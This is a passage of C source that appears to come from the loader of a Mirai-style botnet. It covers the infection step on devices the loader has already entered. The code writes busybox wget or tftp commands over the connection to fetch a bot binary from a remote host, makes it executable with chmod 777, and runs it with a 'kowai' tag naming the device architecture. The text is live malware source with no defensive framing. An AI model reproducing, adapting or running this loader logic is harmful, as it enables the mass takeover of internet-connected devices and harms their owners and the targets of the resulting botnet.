                        ...
                        if (consumed)
                        {
                            ...
                            switch (conn->info.upload_method)
                            {
                                ...
                                case UPLOAD_WGET:
                                    ...
                                    conn->timeout = 120;
                                    util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/8%s8 -O - > "FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                                ...
                                case UPLOAD_TFTP:
                                    ...
                                    conn->timeout = 120;
                                    util_sockprintf(conn->fd, "/bin/busybox tftp -g -l %s -r 8%s8 %s; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
...
#endif
                            util_sockprintf(conn->fd, "./%s; ./%s kowai.%s.%s; " EXEC_QUERY "\r\n", FN_DROPPER, FN_BINARY, id_tag, conn->info.arch);
...
#endif
                            util_sockprintf(conn->fd, "./" FN_BINARY " kowai.%s.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
